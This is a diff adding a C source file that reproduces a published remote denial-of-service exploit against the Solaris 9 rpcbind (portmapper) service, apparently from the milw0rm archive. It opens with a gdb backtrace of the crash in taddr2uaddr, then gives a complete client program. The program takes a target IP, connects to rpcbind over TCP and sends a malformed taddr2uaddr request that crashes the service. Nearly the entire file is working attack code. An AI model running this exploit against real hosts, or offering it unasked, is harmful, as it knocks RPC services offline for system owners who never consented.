@@ -1,0 +1,91 @@
+/*
+////////////////////////////////////////////////////////////
+// Solaris 9 PortBind XDR-DECODE taddr2uaddr() Remote DoS
+////////////////////////////////////////////////////////////
+//
+// Federico L. Bossi Bonin
+// fbossi[at]globalST[dot]com[dot]ar
+/////////////////////////////////////////////////////
+
+
+Program received signal SIGSEGV, Segmentation fault.
+0xff29b5f4 in __inet_taddr2uaddr () from /usr/lib/libnsl.so.1
+(gdb) backtrace
+#0  0xff29b5f4 in __inet_taddr2uaddr () from /usr/lib/libnsl.so.1
+#1  0x00013d88 in rpcbproc_taddr2uaddr_com ()
+#2  0x000161c0 in rpcb_service_4 ()
+(gdb)
+
+*/
+
+#include <string.h>
+#include <rpc/rpc.h>
+
+struct xdr {
+        long long_arg;
+        char *string_arg;
+};
+
+typedef struct xdr xdr;
+static struct timeval TIMEOUT = { 25, 0 };
+
+bool_t xdr_xdr (XDR *xdrs, xdr *objp) {
+        register int32_t *buf;
+
+         if (!xdr_long (xdrs, &objp->long_arg))
+                 return FALSE;
+         if (!xdr_string (xdrs, &objp->string_arg, 4096))
+                 return FALSE;
+        return TRUE;
+}
+
+char ** str_4(xdr *argp, CLIENT *clnt) {
+        static char *clnt_res;
+
+        memset((char *)&clnt_res, 0, sizeof(clnt_res));
+        if (clnt_call (clnt, 8,
+                (xdrproc_t) xdr_xdr, (caddr_t) argp,
+                (xdrproc_t) xdr_wrapstring, (caddr_t) &clnt_res,
+                TIMEOUT) != RPC_SUCCESS) {
+                return (NULL);
+        }
+        return (&clnt_res);
+}
+
+main(int argc, char *argv[]) {
+  CLIENT *c1;
+  char *server;
+  char **sresult;
+
+
+  if (argc !=2){
+    printf("=============================================================\n");
+    printf("Solaris 9 PortBind XDR-DECODE taddr2uaddr() Remote DoS\n");
+    printf("-------------------------------------------------------------\n");
+    printf("Federico L. Bossi Bonin <fbossi@globalST.com.ar>\n");
+    printf("=============================================================\n\n");
+    printf("usage: %s <IP>\n",argv[0]);
+    exit(1);
+  }
+
+  server = argv[1];
+
+if ((c1 = clnt_create(server,100000, 4, "tcp")) == NULL){
+       clnt_pcreateerror(server);
+    exit(1);
+  }
+
+  xdr xdrmessage; 
+  xdrmessage.long_arg = 0;
+  xdrmessage.string_arg="";
+
+  if ((sresult = str_4(&xdrmessage, c1)) == NULL){ 
+   clnt_perror(c1, server);
+   exit(1);
+  }
+
+  clnt_destroy(c1);
+  exit(0);
+}
+
+// milw0rm.com [2008-10-17]
